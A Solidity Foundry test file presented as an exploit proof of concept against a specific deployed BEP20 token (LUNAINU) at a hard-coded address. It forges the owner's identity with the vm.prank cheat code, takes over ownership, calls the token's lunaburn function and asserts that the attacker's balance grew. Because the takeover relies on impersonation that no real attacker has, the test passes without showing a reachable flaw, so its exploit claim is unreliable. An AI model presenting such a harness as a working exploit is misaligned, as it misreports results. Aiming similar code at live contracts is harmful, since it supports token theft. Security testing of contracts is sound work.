pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function lunaburn(uint256 percent_base1000) external;
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
    function pair() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = BEP20LUNAINU(TARGET).getOwner();

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LUNAINU Token");

        // Store initial balance for verification
        initialBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get addresses
        address currentOwner = BEP20LUNAINU(TARGET).getOwner();
        address pair = BEP20LUNAINU(TARGET).pair();

        // Step 2: Impersonate owner to transfer some tokens to pair (so pair has balance > 0)
        // Transfer 1% of total supply to pair
        uint256 totalSupply = 1 * 10**9 * 10**9; // 1e9 * 1e9 = 1e18
        uint256 tokensToPair = totalSupply / 100; // 1% of supply

        vm.prank(currentOwner);
        BEP20LUNAINU(TARGET).transfer(pair, tokensToPair);

        // Step 3: Transfer ownership to attacker
        vm.prank(currentOwner);
        BEP20LUNAINU(TARGET).transferOwnership(payable(attacker));

        // Step 4: Accept ownership
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).acceptOwnership();

        // Step 5: Warp time forward
        vm.warp(block.timestamp + 121);

        // Step 6: Call lunaburn as new owner
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).lunaburn(50); // 5% of pair's balance

        // Step 7: Verify attacker's balance increased
        uint256 finalBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

